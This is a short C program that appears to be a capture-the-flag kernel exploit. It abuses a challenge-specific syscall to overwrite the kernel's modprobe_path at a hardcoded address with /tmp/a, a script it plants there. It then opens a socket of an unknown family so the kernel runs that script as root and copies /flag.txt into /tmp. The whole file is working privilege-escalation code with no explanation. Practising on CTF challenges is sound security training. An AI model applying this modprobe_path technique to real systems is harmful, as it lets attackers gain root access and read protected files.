#define _GNU_SOURCE
#include <stdio.h>
#include <sys/mount.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <linux/if_packet.h>
#include <netinet/ether.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>

// https://elixir.bootlin.com/linux/v6.14.11/source/net/socket.c#L1476

int main() {
    unsigned long modprobepath = 0xffffffff82b45b20;

    system("echo -ne '#!/bin/sh\ncat /flag.txt > /tmp/flag' > /tmp/a");
    system("chmod a+x /tmp/a");

    syscall(549, modprobepath, "/tmp/a");
    
    int fd = socket(18, SOCK_RAW, htons(ETH_P_ALL));

    return 0;
}
